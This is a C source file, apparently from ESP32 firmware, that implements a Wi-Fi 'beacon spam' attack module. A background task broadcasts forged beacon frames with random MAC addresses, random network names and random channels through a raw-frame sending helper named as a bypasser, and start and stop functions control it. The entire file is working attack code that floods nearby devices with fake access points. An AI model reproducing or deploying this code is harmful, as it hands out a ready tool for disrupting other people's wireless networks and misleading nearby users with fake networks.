#include "attack_beacon_spam.h"
#include "wsl_bypasser.h"
#define LOG_LOCAL_LEVEL ESP_LOG_VERBOSE
#include "esp_log.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>

static const char *TAG = "beacon_spam";
static bool spam_running = false;
static TaskHandle_t spam_task = NULL;
static int spam_count = 30;

static void beacon_spam_func(void *pv) {
    ESP_LOGI(TAG, "Beacon spam started (%d SSIDs)", spam_count);
    while (spam_running) {
        for (int i = 0; i < spam_count; i++) {
            uint8_t bssid[6];
            bssid[0] = 0x02;
            for (int j = 1; j < 6; j++) bssid[j] = esp_random() & 0xFF;
            
            char ssid[17];
            int len = 5 + (esp_random() % 12);
            for (int j = 0; j < len; j++) {
                ssid[j] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"[esp_random() % 62];
            }
            ssid[len] = '\0';
            
            uint8_t ch = 1 + (esp_random() % 13);
            wsl_bypasser_send_beacon_frame(bssid, (uint8_t*)ssid, len, ch);
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }
    vTaskDelete(NULL);
}

void beacon_spam_start(int count) {
    if (spam_running) return;
    spam_count = count;
    spam_running = true;
    xTaskCreate(beacon_spam_func, "beacon_spam", 4096, NULL, 5, &spam_task);
}

void beacon_spam_stop(void) {
    if (!spam_running) return;
    spam_running = false;
    if (spam_task) { vTaskDelay(pdMS_TO_TICKS(100)); spam_task = NULL; }
}

bool beacon_spam_is_running(void) { return spam_running; }
